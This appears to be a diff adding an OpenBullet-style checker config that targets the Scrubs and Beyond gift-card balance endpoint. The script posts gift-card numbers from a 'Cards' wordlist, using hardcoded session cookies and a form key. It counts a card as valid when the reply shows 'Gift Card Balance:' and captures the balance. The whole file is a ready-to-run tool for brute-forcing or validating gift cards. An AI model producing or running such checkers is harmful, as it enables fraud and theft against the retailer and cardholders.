@@ -1,0 +1,40 @@
+[SETTINGS]
+{
+  "Name": "Scrubs and Beyond",
+  "SuggestedBots": 1,
+  "LastModified": "2018-09-12T05:16:32.7581331+00:00",
+  "AdditionalInfo": "",
+  "Author": "Legitness",
+  "Version": "1.0.0",
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "Cards",
+  "AllowedWordlist2": "None",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+[SCRIPT]
+REQUEST POST "https://www.scrubsandbeyond.com/gammagc/index/getbalance/" AutoRedirect=TRUE 
+  CONTENT "form_key=QGkveXeh2DYBdc5B&codeNumber=<USER>&_ctl11%3AbtGCSubmit=Submit" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  COOKIE "CACHED_FRONT_FORM_KEY=D247NV6NmC73GdA9; frontend=ac8im995edb06k1humk0itq0t4; frontend_cid=KAdE3ggPu8i4Du7h; blueacorn_newaccountmessaging=1; visid_incap_1021784=y/0Kxm4sSQ2C7hGAtpCR/zSgmFsAAAAAQUIPAAAAAAAxsGIILKUOtY7W5anD87mi; nlbi_1021784=6A6+ayUeFFOJuHnTFNXLJwAAAAD56+zghHaQ3FOZl/YYzp4f; incap_ses_143_1021784=Sx7rdLjJz1wvV8RIzAv8ATSgmFsAAAAAfy3YXEVmDJ+H03/1UgPYyQ==; mt.v=2.1319910864.1536729141183; visitor_id=fb7167ba-3994-4812-8f0e-09435f438581; visit_id=56017301-1960-4a2e-9112-9478e702670e; IR_gbd=scrubsandbeyond.com; IR_PI=284c5b6d-ff2b-3da8-223c-8e78b5d52adf%7C1536815542342; _ga=GA1.2.702975003.1536729142; _gid=GA1.2.1053398165.1536729142; picreel_tracker__first_visit=Tue%20Sep%2011%202018%2022%3A12%3A23%20GMT-0700%20(Mountain%20Standard%20Time); picreel_tracker__visited=1; utag_main=v_id: 0165cc31d24f009e02b6a0eee27003073003006b0093c$_sn:1$_ss:0$_pn:4%3Bexp-session$_st:1536731414752$ses_id:1536729141839%3Bexp-session; AWSALB=Ci1ANC09k10UfXXA+tCbcbVqdX5NBB3GJY2zy9YPIX4+LhvJG7dUNdkjhCqJPG2h8vJg0hjwwtmCA6o1NuGaez7dI9rSdSsEz7NFp419CjAgvXlQrwv0hsq1NB/5; IR_7589=1536729615173%7C1225664%7C1536729142342; _dc_gtm_UA-1422255-1=1; picreel_tracker__page_views=4" 
+  HEADER "Accept: text/javascript, text/html, application/xml, text/xml, */*" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "origin: https://www.scrubsandbeyond.com" 
+  HEADER "referer: https://www.scrubsandbeyond.com/gift-cards.html/" 
+KEYCHECK BanOn4XX=FALSE BanOnToCheck=TRUE 
+  KEYCHAIN Success OR 
+    KEY "Gift Card Balance:" 
+  KEYCHAIN Failure OR 
+    KEY "Gift Card Number not found" 
+PARSE "<SOURCE>" LR ">Gift Card Balance: " "<" Recursive=FALSE -> CAP "Balance" "" "" 
